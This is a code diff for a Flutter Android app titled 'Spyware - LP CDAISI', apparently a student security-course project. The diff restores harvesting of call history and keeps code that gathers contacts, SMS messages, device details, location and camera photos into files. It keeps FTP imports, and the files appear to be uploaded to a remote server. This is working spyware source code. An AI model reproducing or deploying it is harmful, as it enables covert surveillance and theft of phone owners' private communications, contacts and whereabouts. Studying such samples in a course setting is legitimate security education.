@@ -4,16 +4,15 @@
 
 // ***** Importation des plugins *****
 import 'dart:io';
-import 'package:geolocator/geolocator.dart';
-import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
-import 'package:sms/sms.dart';
-import 'package:ftpconnect/ftpConnect.dart';
-import 'package:permission_handler/permission_handler.dart';
-import 'package:contacts_service/contacts_service.dart';
-import 'package:path_provider/path_provider.dart';
-import 'package:call_log/call_log.dart';
-import 'package:network_info_plus/network_info_plus.dart';
+import 'package:path_provider/path_provider.dart'; // Chemin d'accès
+import 'package:permission_handler/permission_handler.dart'; // Permission
+import 'package:ftpconnect/ftpConnect.dart'; // Connexion FTP
+import 'package:geolocator/geolocator.dart'; // Localisation
+import 'package:device_info/device_info.dart'; // Informations
+import 'package:sms/sms.dart'; // SMS
+import 'package:contacts_service/contacts_service.dart'; // Contacts
+import 'package:call_log/call_log.dart'; // Historique d'appel
 
 void main() {
   runApp(const MyApp());
@@ -45,8 +44,9 @@ class MyHomePage extends StatefulWidget {
 class _MyHomePageState extends State<MyHomePage> {
   int _counter = 0;
 
-  // ***** Demande de permission *****
+  // Fonction de lancement
   void _FonctionLancement() async {
+    // ***** Demande de permission *****
     Map<Permission, PermissionStatus> statuses = await [
       Permission.storage,
       Permission.contacts,
@@ -63,14 +63,13 @@ class _MyHomePageState extends State<MyHomePage> {
     Directory TempDir = await getTemporaryDirectory();
 
     // Creation de la liste des fichiers à envoyer
-    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt","${TempDir.path}/NetInfo.txt"];
+    var listeFichiers = ["${TempDir.path}/contact.txt","${TempDir.path}/sms.txt","${TempDir.path}/phone_information.txt","${TempDir.path}/localisation.txt","${TempDir.path}/HistoAppel.txt"];
 
     final FichierContact = "${TempDir.path}/contact.txt";
     final FichierSMS = "${TempDir.path}/sms.txt";
     final FichierInformation = "${TempDir.path}/phone_information.txt";
     final FichierLocalisation = "${TempDir.path}/localisation.txt";
     final FichierHistoAppel = "${TempDir.path}/HistoAppel.txt";
-    final FichierNetInfo = "${TempDir.path}/NetInfo.txt";
 
     // ***** PARTIE INFORMATIONS TELEPHONE *****
     if (Platform.isAndroid) {
@@ -121,22 +120,22 @@ class _MyHomePageState extends State<MyHomePage> {
     File(FichierSMS).writeAsString(infoSMS).then((File fileSMS) {});
 
     // ***** Partie HISTORIQUE D'APPEL *****
-    var histo_appel ="ez";
-    //Iterable<CallLogEntry> entries = await CallLog.get();
-    //for (var entree in entries) {
-      //int? timestamp = entree.timestamp;
-      //final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
-      //final date = date1;
-      //histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
-    //}
+    var histo_appel ="";
+    Iterable<CallLogEntry> entries = await CallLog.get();
+    for (var entree in entries) {
+      int? timestamp = entree.timestamp;
+      final DateTime date1 = DateTime.fromMicrosecondsSinceEpoch(timestamp! * 1000);
+      final date = date1;
+      histo_appel = histo_appel+"Nom du destinataire : "+entree.name!+", Numéro du destinataire : "+entree.number!+", Date : "+date.toString()+"\n";
+    }
     File(FichierHistoAppel).writeAsString(histo_appel).then((File fileHistoAppel) {});
     
-    // ***** Partie Wi-Fi *****
-    final info = NetworkInfo();
-    var wifiIP = await info.getWifiIP();
-    var wifiName = await info.getWifiName();
-    var netinfo ="Nom du Wi-Fi : "+wifiName!+", IP du Wi-Fi"+wifiIP!;
-    File(FichierNetInfo).writeAsString(netinfo).then((File fileNetInfo) {});
+    // ***** Partie Wi-Fi (fonctionne que sur tel physique) *****
+    //final info = NetworkInfo();
+    //var wifiIP = await info.getWifiIP();
+    //var wifiName = await info.getWifiName();
+    //var netinfo ="Nom du Wi-Fi : "+wifiName!+", IP du Wi-Fi"+wifiIP!;
+    //File(FichierNetInfo).writeAsString(netinfo).then((File fileNetInfo) {});
 
     // ***** Partie Envoie des fichiers *****
     // Faire une liste des fichiers à envoyer
@@ -158,7 +157,7 @@ class _MyHomePageState extends State<MyHomePage> {
     // ***** PARTIE PHOTOS *****
 
     // Récupération de la liste de fichier
-    Directory dir = Directory('/sdcard/DCIM/camera');
+    Directory dir = Directory('/storage/1CEC-2F09/images');
     List<FileSystemEntity> phoneFiles = dir.listSync(recursive: true);
 
     // Définition de la liste de fichier
@@ -190,16 +189,17 @@ class _MyHomePageState extends State<MyHomePage> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
+      backgroundColor: Colors.white,
       appBar: AppBar(
         // Titre de l'application
-        title: const Text("Spyware"),
+        title: const Text("Spyware - LP CDAISI"),
       ),
       body: Center(
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: <Widget>[
             // Ajout de l'image
-            Image.asset("images/cdaisi.png",width: 200,height: 200),
+            Image.asset("images/cdaisi.png", width: 200, height: 200),
             // Définition du bouton
             MaterialButton(
                 // Nom du bouton
